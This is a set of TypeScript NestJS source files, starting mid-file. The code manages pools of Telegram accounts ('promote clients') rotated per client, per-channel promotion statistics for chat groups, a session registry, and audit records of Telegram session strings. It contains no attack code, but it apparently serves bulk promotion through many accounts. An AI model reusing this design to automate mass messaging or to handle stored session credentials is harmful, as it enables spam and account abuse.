'active',\n                        lastUsed: { $gte: last24Hours }\n                    }\n                },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } }\n            ])\n        ]);\n\n        // Convert aggregation results to maps for easy lookup\n        const assignedCountMap = new Map(assignedCounts.map((item: any) => [item._id, item.count]));\n        const activeCountMap = new Map(activeCounts.map((item: any) => [item._id, item.count]));\n        const inactiveCountMap = new Map(inactiveCounts.map((item: any) => [item._id, item.count]));\n        const neverUsedCountMap = new Map(neverUsedCounts.map((item: any) => [item._id, item.count]));\n        const recentlyUsedCountMap = new Map(recentlyUsedCounts.map((item: any) => [item._id, item.count]));\n\n        const distributionPerClient = [];\n        let clientsWithSufficient = 0;\n        let clientsNeedingMore = 0;\n        let totalNeeded = 0;\n\n        for (const client of clients) {\n            const assignedCount = assignedCountMap.get(client.clientId) || 0;\n            const activeCount = activeCountMap.get(client.clientId) || 0;\n            const inactiveCount = inactiveCountMap.get(client.clientId) || 0;\n            const neverUsed = neverUsedCountMap.get(client.clientId) || 0;\n            const usedInLast24Hours = recentlyUsedCountMap.get(client.clientId) || 0;\n            const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - activeCount); // Only count active clients\n            const status = needed === 0 ? 'sufficient' : 'needs_more';\n\n            distributionPerClient.push({\n                clientId: client.clientId,\n                assignedCount,\n                activeCount,\n                inactiveCount,\n                needed,\n                status,\n                neverUsed,\n                usedInLast24Hours\n            });\n\n            if (status === 'sufficient') {\n                clientsWithSufficient++;\n            } else {\n                clientsNeedingMore++;\n                totalNeeded += needed;\n            }\n        }\n\n        const maxPerTrigger = 10;\n        const triggersNeeded = Math.ceil(totalNeeded / maxPerTrigger);\n\n        return {\n            totalPromoteClients,\n            unassignedPromoteClients,\n            activePromoteClients,\n            inactivePromoteClients,\n            distributionPerClient,\n            summary: {\n                clientsWithSufficientPromoteClients: clientsWithSufficient,\n                clientsNeedingPromoteClients: clientsNeedingMore,\n                totalPromoteClientsNeeded: totalNeeded,\n                maxPromoteClientsPerTrigger: maxPerTrigger,\n                triggersNeededToSatisfyAll: triggersNeeded\n            }\n        };\n    }\n\n    /**\n     * Get all promote clients by status\n     */\n    async getPromoteClientsByStatus(status: string): Promise<PromoteClient[]> {\n        return this.promoteClientModel.find({ status }).exec();\n    }\n\n\n    async getPromoteClientsWithMessages(): Promise<Array<{ mobile: string, status: string, message: string, clientId?: string, lastUsed?: Date }>> {\n        return this.promoteClientModel\n            .find({}, { mobile: 1, status: 1, message: 1, clientId: 1, lastUsed: 1 })\n            .exec();\n    }\n\n    async getLeastRecentlyUsedPromoteClients(clientId: string, limit: number = 1): Promise<PromoteClient[]> {\n        return this.promoteClientModel\n            .find({ clientId, status: 'active' })\n            .sort({ lastUsed: 1, _id: 1 }) // Sort by lastUsed ascending (oldest first), then by _id for consistency\n            .limit(limit)\n            .exec();\n    }\n\n    /**\n     * Get next available promote client for a specific client (round-robin based on lastUsed)\n     */\n    async getNextAvailablePromoteClient(clientId: string): Promise<PromoteClient | null> {\n        const clients = await this.getLeastRecentlyUsedPromoteClients(clientId, 1);\n        return clients.length > 0 ? clients[0] : null;\n    }\n\n    /**\n     * Get promote clients that haven't been used for a specified time period\n     */\n    async getUnusedPromoteClients(hoursAgo: number = 24, clientId?: string): Promise<PromoteClient[]> {\n        const cutoffDate = new Date(Date.now() - (hoursAgo * 60 * 60 * 1000));\n        const filter: any = {\n            status: 'active',\n            $or: [\n                { lastUsed: { $lt: cutoffDate } },\n                { lastUsed: { $exists: false } },\n                { lastUsed: null }\n            ]\n        };\n\n        if (clientId) {\n            filter.clientId = clientId;\n        }\n\n        return this.promoteClientModel.find(filter).exec();\n    }\n\n    /**\n     * Get usage statistics for promote clients\n     */\n    async getUsageStatistics(clientId?: string): Promise<{\n        totalClients: number;\n        neverUsed: number;\n        usedInLast24Hours: number;\n        usedInLastWeek: number;\n        averageUsageGap: number;\n    }> {\n        const filter: any = { status: 'active' };\n        if (clientId) {\n            filter.clientId = clientId;\n        }\n\n        const now = new Date();\n        const last24Hours = new Date(now.getTime() - (24 * 60 * 60 * 1000));\n        const lastWeek = new Date(now.getTime() - (7 * 24 * 60 * 60 * 1000));\n\n        const [\n            totalClients,\n            neverUsed,\n            usedInLast24Hours,\n            usedInLastWeek,\n            allClients\n        ] = await Promise.all([\n            this.promoteClientModel.countDocuments(filter),\n            this.promoteClientModel.countDocuments({\n                ...filter,\n                $or: [\n                    { lastUsed: { $exists: false } },\n                    { lastUsed: null }\n                ]\n            }),\n            this.promoteClientModel.countDocuments({\n                ...filter,\n                lastUsed: { $gte: last24Hours }\n            }),\n            this.promoteClientModel.countDocuments({\n                ...filter,\n                lastUsed: { $gte: lastWeek }\n            }),\n            this.promoteClientModel.find(filter, { lastUsed: 1, createdAt: 1 }).exec()\n        ]);\n\n        // Calculate average usage gap\n        let totalGap = 0;\n        let gapCount = 0;\n\n        for (const client of allClients) {\n            if (client.lastUsed) {\n                const gap = now.getTime() - new Date(client.lastUsed).getTime();\n                totalGap += gap;\n                gapCount++;\n            }\n        }\n\n        const averageUsageGap = gapCount > 0 ? totalGap / gapCount / (60 * 60 * 1000) : 0; // in hours\n\n        return {\n            totalClients,\n            neverUsed,\n            usedInLast24Hours,\n            usedInLastWeek,\n            averageUsageGap\n        };\n    }\n}\n","// Export all schemas\nexport * from './promote-client.schema';\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type PromoteClientDocument = PromoteClient & Document;\n@Schema({ collection: 'promoteClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class PromoteClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  lastActive: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n\n  @Prop({ required: true })\n  clientId: string;\n\n  @Prop({ required: false, default: 'active' })\n  status: string;\n\n  @Prop({ required: false, default: 'Account is functioning properly' })\n  message: string;\n\n  @Prop({ required: false, type: Date, default: null })\n  lastUsed: Date;\n}\n\nexport const PromoteClientSchema = SchemaFactory.createForClass(PromoteClient);\n\n// Create index for better performance when querying by clientId\nPromoteClientSchema.index({ clientId: 1 });\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { PromoteMsgsService } from './promote-msgs.service';\n\n@ApiTags('Promote-msgs')\n@Controller('promote-msgs')\nexport class PromoteMsgsController {\n  constructor(private readonly promoteMsgsService: PromoteMsgsService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get promote-msgs data' })\n  async findOne(): Promise<any>{\n    return this.promoteMsgsService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update promote-msgs' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.promoteMsgsService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteMsgsService } from './promote-msgs.service';\nimport { PromoteMsgsController } from './promote-msgs.controller';\nimport { PromoteMsgSchema } from './promote-msgs.schema';\nimport { InitModule } from '../ConfigurationInit';\n\n@Global()\n@Module({\n  imports: [\n    InitModule,\n    PromoteMsgModule,\n    MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: PromoteMsgSchema }]),\n  ],\n  providers: [PromoteMsgsService],\n  controllers: [PromoteMsgsController],\n  exports: [PromoteMsgsService],\n})\nexport class PromoteMsgModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type PromoteMsgDocument = PromoteMsg & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class PromoteMsg {}\n\nexport const PromoteMsgSchema = SchemaFactory.createForClass(PromoteMsg);\nPromoteMsgSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { PromoteMsg } from './promote-msgs.schema';\n\n@Injectable()\nexport class PromoteMsgsService {\n    constructor(@InjectModel('promotemsgModule') private promotemsgModel: Model<PromoteMsg>) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();\n        if (!user) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.promotemsgModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","// create-promote-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreatePromoteStatDto {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  releaseDay: number;\n\n  @ApiProperty({ example: 1719860106247.0, description: 'Last Updated TimeStamp' })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  isActive: boolean;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  channels: string[];\n}\n","// update-promote-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteStatDto } from './create-promote-stat.dto';\n\nexport class UpdatePromoteStatDto extends PartialType(CreatePromoteStatDto) {}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { PromoteStatService } from './promote-stat.service';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\n\n@ApiTags('promote-stats')\n@Controller('promote-stats')\nexport class PromoteStatController {\n  constructor(private readonly promoteStatService: PromoteStatService) {}\n\n  @Post()\n  async create(@Body() createPromoteStatDto: CreatePromoteStatDto) {\n    return this.promoteStatService.create(createPromoteStatDto);\n  }\n\n  @Get(':client')\n  async findByClient(@Param('client') client: string) {\n    return this.promoteStatService.findByClient(client);\n  }\n\n  @Put(':client')\n  async update(\n    @Param('client') client: string,\n    @Body() updatePromoteStatDto: UpdatePromoteStatDto,\n  ) {\n    return this.promoteStatService.update(client, updatePromoteStatDto);\n  }\n\n  @Delete(':client')\n  async deleteOne(@Param('client') client: string) {\n    return this.promoteStatService.deleteOne(client);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.promoteStatService.deleteAll();\n  }\n}\n","import { InitModule } from './../ConfigurationInit/init.module';\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteStatService } from './promote-stat.service';\nimport { PromoteStatController } from './promote-stat.controller';\nimport { PromoteStat, PromoteStatSchema } from './schemas/promote-stat.schema';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: PromoteStat.name, collection: \"promoteStats\", schema: PromoteStatSchema }]),\n    ClientModule\n  ],\n  controllers: [PromoteStatController],\n  providers: [PromoteStatService],\n  exports: [PromoteStatService]\n})\nexport class PromoteStatModule { }\n","import { Inject, Injectable, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\nimport { PromoteStat, PromoteStatDocument } from './schemas/promote-stat.schema';\nimport { ClientService } from '../clients/client.service';\n\n@Injectable()\nexport class PromoteStatService {\n  constructor(@InjectModel(PromoteStat.name) private promoteStatModel: Model<PromoteStatDocument>,\n    @Inject(forwardRef(() => ClientService))\n    private clientService: ClientService,) { }\n\n  async create(createPromoteStatDto: CreatePromoteStatDto): Promise<PromoteStat> {\n    const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);\n    return createdPromoteStat.save();\n  }\n\n  async findAll(): Promise<PromoteStat[]> {\n    const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();\n    return promoteStat;\n  }\n\n\n  async findByClient(client: string): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOne({ client }).exec()\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async update(client: string, updatePromoteStatDto: UpdatePromoteStatDto): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async deleteOne(client: string): Promise<void> {\n    const result = await this.promoteStatModel.deleteOne({ client }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.promoteStatModel.deleteMany({}).exec();\n  }\n\n  async reinitPromoteStats() {\n    const users = await this.findAll()\n    for (const user of users) {\n      await this.promoteStatModel.updateOne({ client: user.client },\n        {\n          $set: {\n            totalCount: 0,\n            uniqueChannels: 0,\n            releaseDay: Date.now(),\n            lastUpdatedTimeStamp: Date.now(),\n            data: {}//Object.fromEntries((await this.promoteStatModel.findOne({ client: user.client })).channels?.map(channel => [channel, 0])),\n          }\n        }\n      );\n    }\n  }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type PromoteStatDocument = PromoteStat & Document;\n\n@Schema()\nexport class PromoteStat {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  @Prop({ required: true, unique: true })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  @Prop({ required: true, type: Map, of: Number })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  @Prop({ required: true })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  @Prop({ required: true })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  @Prop({ required: true })\n  releaseDay: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  @Prop({ required: true })\n  isActive: boolean;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Last Updated TimeStamp' })\n  @Prop({ required: true })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  @Prop({ required: true, type: [String] })\n  channels: string[];\n}\n\nexport const PromoteStatSchema = SchemaFactory.createForClass(PromoteStat);\n","import { Injectable } from '@nestjs/common';\r\nimport { TelegramClient } from 'telegram';\r\nimport { TelegramLogger } from '../Telegram/utils/telegram-logger';\r\n\r\ninterface ClientInfo {\r\n    client: TelegramClient;\r\n    mobile: string;\r\n    sessionString: string;\r\n    createdAt: Date;\r\n    lastActivity: Date;\r\n    isCreating: boolean;\r\n    lockId?: string;\r\n}\r\n\r\n@Injectable()\r\nexport class ClientRegistry {\r\n    private static instance: ClientRegistry | null = null;\r\n    private readonly clients = new Map<string, ClientInfo>();\r\n    private readonly logger = TelegramLogger.getInstance();\r\n    private readonly locks = new Map<string, { acquired: Date; lockId: string }>();\r\n\r\n    // Maximum time to wait for a lock (in ms)\r\n    private readonly LOCK_TIMEOUT = 30000; // 30 seconds\r\n\r\n    // Maximum time a lock can be held (in ms)\r\n    private readonly LOCK_EXPIRY = 120000; // 2 minutes\r\n\r\n    // Client inactivity timeout (in ms)\r\n    private readonly CLIENT_TIMEOUT = 300000; // 5 minutes\r\n\r\n    private constructor() {\r\n        // Start cleanup interval\r\n        setInterval(() => this.cleanupInactiveClients(), 60000); // Run every minute\r\n        setInterval(() => this.cleanupExpiredLocks(), 30000); // Run every 30 seconds\r\n    }\r\n\r\n    public static getInstance(): ClientRegistry {\r\n        if (!ClientRegistry.instance) {\r\n            ClientRegistry.instance = new ClientRegistry();\r\n        }\r\n        return ClientRegistry.instance;\r\n    }\r\n\r\n    /**\r\n     * Acquire a lock for a phone number to prevent concurrent operations\r\n     */\r\n    async acquireLock(mobile: string): Promise<string | null> {\r\n        const lockId = `${mobile}_${Date.now()}_${Math.random()}`;\r\n        const now = new Date();\r\n\r\n        // Check if lock already exists\r\n        const existingLock = this.locks.get(mobile);\r\n        if (existingLock) {\r\n            // Check if lock is expired\r\n            if (now.getTime() - existingLock.acquired.getTime() > this.LOCK_EXPIRY) {\r\n                this.locks.delete(mobile);\r\n                this.logger.logOperation(mobile, 'Removed expired lock');\r\n            } else {\r\n                this.logger.logOperation(mobile, 'Lock already exists, waiting...');\r\n                return null;\r\n            }\r\n        }\r\n\r\n        // Acquire lock\r\n        this.locks.set(mobile, { acquired: now, lockId });\r\n        this.logger.logOperation(mobile, `Lock acquired: ${lockId}`);\r\n        return lockId;\r\n    }\r\n\r\n    /**\r\n     * Release a lock for a phone number\r\n     */\r\n    releaseLock(mobile: string, lockId: string): boolean {\r\n        const lock = this.locks.get(mobile);\r\n        if (lock && lock.lockId === lockId) {\r\n            this.locks.delete(mobile);\r\n            this.logger.logOperation(mobile, `Lock released: ${lockId}`);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    /**\r\n     * Wait for lock acquisition with timeout\r\n     */\r\n    async waitForLock(mobile: string): Promise<string | null> {\r\n        const startTime = Date.now();\r\n\r\n        while (Date.now() - startTime < this.LOCK_TIMEOUT) {\r\n            const lockId = await this.acquireLock(mobile);\r\n            if (lockId) {\r\n                return lockId;\r\n            }\r\n\r\n            // Wait 1 second before retrying\r\n            await new Promise(resolve => setTimeout(resolve, 1000));\r\n        }\r\n\r\n        throw new Error(`Lock acquisition timeout for ${mobile}`);\r\n    }\r\n\r\n    /**\r\n     * Check if a client exists for the phone number\r\n     */\r\n    hasClient(mobile: string): boolean {\r\n        return this.clients.has(mobile);\r\n    }\r\n\r\n    /**\r\n     * Get client info if it exists\r\n     */\r\n    getClientInfo(mobile: string): ClientInfo | null {\r\n        return this.clients.get(mobile) || null;\r\n    }\r\n\r\n    /**\r\n     * Register a new client (only if none exists or after acquiring lock)\r\n     */\r\n    async registerClient(\r\n        mobile: string,\r\n        client: TelegramClient,\r\n        sessionString: string,\r\n        lockId: string\r\n    ): Promise<boolean> {\r\n        // Verify lock ownership\r\n        const lock = this.locks.get(mobile);\r\n        if (!lock || lock.lockId !== lockId) {\r\n            throw new Error(`Invalid lock for registering client: ${mobile}`);\r\n        }\r\n\r\n        // Check if client already exists\r\n        if (this.clients.has(mobile)) {\r\n            this.logger.logError(mobile, 'Client already exists, cannot register new one', new Error('Duplicate client'));\r\n            return false;\r\n        }\r\n\r\n        const clientInfo: ClientInfo = {\r\n            client,\r\n            mobile,\r\n            sessionString,\r\n            createdAt: new Date(),\r\n            lastActivity: new Date(),\r\n            isCreating: false,\r\n            lockId\r\n        };\r\n\r\n        this.clients.set(mobile, clientInfo);\r\n        this.logger.logOperation(mobile, 'Client registered successfully');\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * Mark a client as currently being created\r\n     */\r\n    markClientCreating(mobile: string, lockId: string): boolean {\r\n        const lock = this.locks.get(mobile);\r\n        if (!lock || lock.lockId !== lockId) {\r\n            return false;\r\n        }\r\n\r\n        const existing = this.clients.get(mobile);\r\n        if (existing) {\r\n            existing.isCreating = true;\r\n            existing.lastActivity = new Date();\r\n            return true;\r\n        }\r\n\r\n        // Create placeholder for client being created\r\n        const clientInfo: ClientInfo = {\r\n            client: null as any, // Will be set later\r\n            mobile,\r\n            sessionString: '',\r\n            createdAt: new Date(),\r\n            lastActivity: new Date(),\r\n            isCreating: true,\r\n            lockId\r\n        };\r\n\r\n        this.clients.set(mobile, clientInfo);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * Update activity timestamp\r\n     */\r\n    updateActivity(mobile: string): void {\r\n        const clientInfo = this.clients.get(mobile);\r\n        if (clientInfo) {\r\n            clientInfo.lastActivity = new Date();\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Remove a client\r\n     */\r\n    async removeClient(mobile: string, lockId?: string): Promise<boolean> {\r\n        const clientInfo = this.clients.get(mobile);\r\n        if (!clientInfo) {\r\n            return false;\r\n        }\r\n\r\n        // If lockId is provided, verify ownership\r\n        if (lockId) {\r\n            const lock = this.locks.get(mobile);\r\n            if (!lock || lock.lockId !== lockId) {\r\n                this.logger.logError(mobile, 'Invalid lock for removing client', new Error('Invalid lock'));\r\n                return false;\r\n            }\r\n        }\r\n\r\n        // Disconnect client if it exists\r\n        if (clientInfo.client) {\r\n            try {\r\n                let tempClient = clientInfo.client;\r\n                if (tempClient) {\r\n                    try {\r\n                        await tempClient.destroy();\r\n                        tempClient._eventBuilders = [];\r\n                        this.logger.logOperation(mobile, 'Temporary client cleaned up');\r\n                    } catch (cleanupError) {\r\n                        this.logger.logError(mobile, 'Failed to cleanup temporary client', cleanupError);\r\n                    } finally {\r\n                        if (tempClient) {\r\n                            tempClient._destroyed = true;\r\n                            if (tempClient._sender && typeof tempClient._sender.disconnect === 'function') {\r\n                                await tempClient._sender.disconnect();\r\n                            }\r\n                            tempClient = null;\r\n                        }\r\n                    }\r\n                } this.logger.logOperation(mobile, 'Client disconnected during removal');\r\n            } catch (error) {\r\n                this.logger.logError(mobile, 'Error disconnecting client during removal', error);\r\n            }\r\n        }\r\n\r\n        this.clients.delete(mobile);\r\n        this.logger.logOperation(mobile, 'Client removed from registry');\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * Get active client count\r\n     */\r\n    getActiveClientCount(): number {\r\n        return this.clients.size;\r\n    }\r\n\r\n    /**\r\n     * Get all phone numbers with active clients\r\n     */\r\n    getActivemobiles(): string[] {\r\n        return Array.from(this.clients.keys());\r\n    }\r\n\r\n    /**\r\n     * Cleanup inactive clients\r\n     */\r\n    private async cleanupInactiveClients(): Promise<void> {\r\n        const now = new Date();\r\n        const inactiveClients: string[] = [];\r\n\r\n        for (const [mobile, clientInfo] of this.clients.entries()) {\r\n            const inactiveTime = now.getTime() - clientInfo.lastActivity.getTime();\r\n\r\n            if (inactiveTime > this.CLIENT_TIMEOUT) {\r\n                inactiveClients.push(mobile);\r\n            }\r\n        }\r\n\r\n        for (const mobile of inactiveClients) {\r\n            this.logger.logOperation(mobile, 'Removing inactive client');\r\n            await this.removeClient(mobile);\r\n        }\r\n\r\n        if (inactiveClients.length > 0) {\r\n            this.logger.logOperation('SYSTEM', `Cleaned up ${inactiveClients.length} inactive clients`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Cleanup expired locks\r\n     */\r\n    private cleanupExpiredLocks(): void {\r\n        const now = new Date();\r\n        const expiredLocks: string[] = [];\r\n\r\n        for (const [mobile, lock] of this.locks.entries()) {\r\n            const lockAge = now.getTime() - lock.acquired.getTime();\r\n\r\n            if (lockAge > this.LOCK_EXPIRY) {\r\n                expiredLocks.push(mobile);\r\n            }\r\n        }\r\n\r\n        for (const mobile of expiredLocks) {\r\n            this.locks.delete(mobile);\r\n            this.logger.logOperation(mobile, 'Removed expired lock');\r\n        }\r\n\r\n        if (expiredLocks.length > 0) {\r\n            this.logger.logOperation('SYSTEM', `Cleaned up ${expiredLocks.length} expired locks`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Force cleanup all clients and locks for a phone number\r\n     */\r\n    async forceCleanup(mobile: string): Promise<number> {\r\n        let cleanedCount = 0;\r\n\r\n        // Remove lock\r\n        if (this.locks.has(mobile)) {\r\n            this.locks.delete(mobile);\r\n            cleanedCount++;\r\n        }\r\n\r\n        // Remove client\r\n        if (await this.removeClient(mobile)) {\r\n            cleanedCount++;\r\n        }\r\n\r\n        this.logger.logOperation(mobile, `Force cleanup completed, removed ${cleanedCount} items`);\r\n        return cleanedCount;\r\n    }\r\n\r\n    /**\r\n     * Get registry statistics\r\n     */\r\n    getStats(): {\r\n        activeClients: number;\r\n        activeLocks: number;\r\n        mobiles: string[];\r\n    } {\r\n        return {\r\n            activeClients: this.clients.size,\r\n            activeLocks: this.locks.size,\r\n            mobiles: Array.from(this.clients.keys())\r\n        };\r\n    }\r\n}\r\n","export * from './session.service';\r\nexport * from './session.controller';\r\nexport * from './session.module';\r\nexport * from './client-registry';\r\nexport * from './session-audit.service';\r\nexport * from './schemas/sessions.schema';\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type SessionAuditDocument = SessionAudit & Document;\r\n\r\nexport enum SessionStatus {\r\n    CREATED = 'created',\r\n    ACTIVE = 'active',\r\n    EXPIRED = 'expired',\r\n    REVOKED = 'revoked',\r\n    FAILED = 'failed'\r\n}\r\n\r\nexport enum SessionCreationMethod {\r\n    OLD_SESSION = 'old_session',\r\n    USER_MOBILE = 'user_mobile',\r\n    INPUT_SESSION = 'input_session'\r\n}\r\n\r\n@Schema({\r\n    collection: 'session_audits',\r\n    versionKey: false,\r\n    autoIndex: true,\r\n    timestamps: true,\r\n    toJSON: {\r\n        virtuals: true,\r\n        transform: (doc, ret) => {\r\n            delete ret._id;\r\n            delete ret.__v;\r\n        },\r\n    },\r\n})\r\nexport class SessionAudit {\r\n    @ApiProperty({ example: '916265240911', description: 'Phone number associated with the session' })\r\n    @Prop({ required: true, index: true })\r\n    mobile: string;\r\n\r\n    @ApiProperty({ example: '1BQANOTEuM==...', description: 'Encrypted session string' })\r\n    @Prop()\r\n    sessionString?: string;\r\n\r\n    @ApiProperty({ example: 'active', description: 'Current status of the session', enum: SessionStatus })\r\n    @Prop({ required: true, enum: SessionStatus, default: SessionStatus.CREATED })\r\n    status: SessionStatus;\r\n\r\n    @ApiProperty({ example: 'old_session', description: 'Method used to create the session', enum: SessionCreationMethod })\r\n    @Prop({ required: true, enum: SessionCreationMethod })\r\n    creationMethod: SessionCreationMethod;\r\n\r\n    @ApiProperty({ example: 'Session created successfully', description: 'Creation success/failure message' })\r\n    @Prop()\r\n    creationMessage?: string;\r\n\r\n    @ApiProperty({ example: '1BQANOTEuM==...', description: 'Previous session string used for creation (if applicable)' })\r\n    @Prop()\r\n    previousSessionString?: string;\r\n\r\n    @ApiProperty({ example: '2023-12-01T10:00:00Z', description: 'When the session was created' })\r\n    @Prop({ default: Date.now })\r\n    createdAt: Date;\r\n\r\n    @ApiProperty({ example: '2023-12-01T15:30:00Z', description: 'Last time the session was used' })\r\n    @Prop({ default: Date.now })\r\n    lastUsedAt: Date;\r\n\r\n    @ApiProperty({ example: '2024-01-01T10:00:00Z', description: 'When the session expires' })\r\n    @Prop()\r\n    expiresAt?: Date;\r\n\r\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID associated with this session' })\r\n    @Prop()\r\n    clientId?: string;\r\n\r\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username associated with this session' })\r\n    @Prop()\r\n    username?: string;\r\n\r\n    @ApiProperty({ example: 3, description: 'Number of retry attempts during creation' })\r\n    @Prop({ default: 0 })\r\n    retryAttempts: number;\r\n\r\n    @ApiProperty({ example: 'Rate limit exceeded', description: 'Error message if creation failed' })\r\n    @Prop()\r\n    errorMessage?: string;\r\n\r\n    @ApiProperty({ \r\n        example: { userAgent: 'Telegram-Desktop/1.0', ipAddress: '192.168.1.1' }, \r\n        description: 'Additional metadata about session creation' \r\n    })\r\n    @Prop({ type: Object })\r\n    metadata?: Record<string, any>;\r\n\r\n    @ApiProperty({ example: false, description: 'Whether this session is currently active' })\r\n    @Prop({ default: true })\r\n    isActive: boolean;\r\n\r\n    @ApiProperty({ example: '2023-12-01T16:00:00Z', description: 'When the session was revoked/expired' })\r\n    @Prop()\r\n    revokedAt?: Date;\r\n\r\n    @ApiProperty({ example: 'manual_revocation', description: 'Reason for session revocation' })\r\n    @Prop()\r\n    revocationReason?: string;\r\n\r\n    @ApiProperty({ example: 5, description: 'Number of times this session has been used' })\r\n    @Prop({ default: 0 })\r\n    usageCount: number;\r\n\r\n    @ApiProperty({ example: 'session_validation_failed', description: 'Last known error with this session' })\r\n    @Prop()\r\n    lastError?: string;\r\n\r\n    @ApiProperty({ example: '2023-12-01T15:45:00Z', description: 'When the last error occurred' })\r\n    @Prop()\r\n    lastErrorAt?: Date;\r\n}\r\n\r\nexport const SessionAuditSchema = SchemaFactory.createForClass(SessionAudit);\r\n\r\n// Create indexes for better query performance\r\nSessionAuditSchema.index({ mobile: 1, createdAt: -1 